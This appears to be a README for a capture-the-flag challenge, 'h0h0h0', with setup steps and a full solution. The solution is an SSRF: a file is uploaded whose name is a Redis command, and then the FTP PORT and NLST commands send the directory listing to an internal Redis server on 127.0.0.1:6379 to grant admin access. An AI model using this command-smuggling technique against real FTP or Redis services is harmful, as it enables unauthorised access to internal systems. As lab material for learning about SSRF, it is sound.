# h0h0h0 challenge

### A SSRF through a FTP server

## How to run

1. docker-compose up --build, both ports 5000 and 5001 are used by default

## How to solve

Using the same credentials (eg: `rootroot:rootroot`)

1. Login on the FTP server with a ftp client
2. Try downloading a file name `test`, you will see an error with the path which contains your `hash`
3. Create a file named `set YOUR_HASH_admin 1` (replace YOUR_HASH) on your computer
4. Upload the file on the FTP server with `put "set YOUR_HASH_admin 1"`
5. Login back on the FTP server with telnet and enter these commands (this basicly send the dirlist to the redis server which will interpret it as commands)
    1. USER rootroot
    2. PASS rootroot
    3. PORT 127,0,0,1,0,6379
    4. NLST
    5. QUIT
6. Login back on the FTP server with a ftp client
7. Download the file named flag
